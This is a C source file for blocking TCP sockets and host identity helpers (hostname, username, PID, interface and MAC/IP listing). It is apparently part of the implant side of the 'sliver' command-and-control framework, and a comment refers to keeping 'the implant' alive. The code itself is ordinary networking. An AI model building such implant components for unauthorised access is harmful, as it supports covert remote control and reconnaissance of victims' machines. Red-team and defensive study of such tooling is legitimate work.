/* src/platform/posix/net.c - blocking TCP sockets (POSIX). */
#if !defined(_POSIX_C_SOURCE) || (_POSIX_C_SOURCE < 200809L)
#undef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif

#include "sliver/platform.h"
#include "sliver/proc.h"

#include <netdb.h>
#include <net/if_dl.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

struct sliver_socket {
  int fd;
};

sliver_socket_t *sliver_tcp_connect(const char *host, uint16_t port) {
  struct addrinfo hints;
  struct addrinfo *res = NULL;
  struct addrinfo *it;
  char service[8];
  sliver_socket_t *sock = NULL;
  int fd = -1;

  if (host == NULL) {
    return NULL;
  }
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  (void)snprintf(service, sizeof(service), "%u", (unsigned)port);
  if (getaddrinfo(host, service, &hints, &res) != 0) {
    return NULL;
  }
  for (it = res; it != NULL; it = it->ai_next) {
    fd = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
    if (fd < 0) {
      continue;
    }
    if (connect(fd, it->ai_addr, it->ai_addrlen) == 0) {
      sock = (sliver_socket_t *)calloc(1, sizeof(*sock));
      if (sock != NULL) {
        sock->fd = fd;
        fd = -1;
      }
      break;
    }
    (void)close(fd);
    fd = -1;
  }
  freeaddrinfo(res);
  if (fd >= 0) {
    (void)close(fd);
  }
  return sock;
}

long sliver_socket_send(sliver_socket_t *s, const void *buf, size_t len) {
  ssize_t n;
  if (s == NULL) {
    return -1;
  }
  /* MSG_NOSIGNAL: a peer reset must not raise SIGPIPE and kill the implant. */
#ifdef MSG_NOSIGNAL
  n = send(s->fd, buf, len, MSG_NOSIGNAL);
#else
  n = send(s->fd, buf, len, 0);
#endif
  return n < 0 ? -1 : (long)n;
}

long sliver_socket_recv(sliver_socket_t *s, void *buf, size_t len) {
  ssize_t n;
  if (s == NULL || buf == NULL) {
    return -1;
  }
  n = recv(s->fd, buf, len, 0);
  return (long)n;
}

void sliver_socket_close(sliver_socket_t *s) {
  if (s == NULL) {
    return;
  }
  (void)close(s->fd);
  free(s);
}

/* --- identity helpers --------------------------------------------------- */
#include <stdio.h>

int sliver_hostname(char *buf, size_t cap) {
  if (buf == NULL || cap == 0) {
    return -1;
  }
  if (gethostname(buf, cap) != 0) {
    return -1;
  }
  buf[cap - 1] = '\0';
  return 0;
}

int sliver_username(char *buf, size_t cap) {
  const char *user = getenv("USER");
  if (user == NULL) {
    user = getenv("LOGNAME");
  }
  if (buf == NULL || cap == 0 || user == NULL) {
    return -1;
  }
  (void)snprintf(buf, cap, "%s", user);
  return 0;
}

unsigned sliver_current_pid(void) { return (unsigned)getpid(); }

void sliver_socket_set_recv_timeout(sliver_socket_t *s, int ms) {
  struct timeval tv;
  if (s == NULL) {
    return;
  }
  tv.tv_sec = ms / 1000;
  tv.tv_usec = (ms % 1000) * 1000;
  (void)setsockopt(s->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
}


/* --- interfaces (ifconfig) ---------------------------------------------- */
int sliver_net_list(sliver_iface_t *out, int max) {
  struct ifaddrs *list = NULL;
  struct ifaddrs *cur;
  int count = 0;
  int i;

  if (out == NULL || max <= 0) {
    return -1;
  }
  if (getifaddrs(&list) != 0) {
    return -1;
  }
  for (i = 0; i < max; ++i) {
    memset(&out[i], 0, sizeof(out[i]));
    out[i].index = i;
  }
  for (cur = list; cur != NULL && count < max; cur = cur->ifa_next) {
    char host[64];
    int idx = -1;
    /* Group addresses by interface name. */
    for (i = 0; i < count; ++i) {
      if (strcmp(out[i].name, cur->ifa_name) == 0) {
        idx = i;
        break;
      }
    }
    if (idx < 0) {
      idx = count++;
      (void)snprintf(out[idx].name, sizeof(out[idx].name), "%s", cur->ifa_name != NULL ? cur->ifa_name : "");
    }
    if (cur->ifa_addr == NULL) {
      continue;
    }
    if (cur->ifa_addr->sa_family == AF_LINK) {
      const struct sockaddr_dl *sdl = (const struct sockaddr_dl *)cur->ifa_addr;
      if (sdl->sdl_alen == 6) {
        const unsigned char *m = (const unsigned char *)LLADDR(sdl);
        (void)snprintf(out[idx].mac, sizeof(out[idx].mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                       m[0], m[1], m[2], m[3], m[4], m[5]);
      }
      continue;
    }
    if ((cur->ifa_addr->sa_family == AF_INET || cur->ifa_addr->sa_family == AF_INET6) &&
        out[idx].ip_count < 8) {
      if (getnameinfo(cur->ifa_addr, cur->ifa_addr->sa_len, host, sizeof(host), NULL, 0,
                      NI_NUMERICHOST) == 0) {
        (void)snprintf(out[idx].ips[out[idx].ip_count], sizeof(out[idx].ips[0]), "%s", host);
        out[idx].ip_count++;
      }
    }
  }
  freeifaddrs(list);
  return count;
}


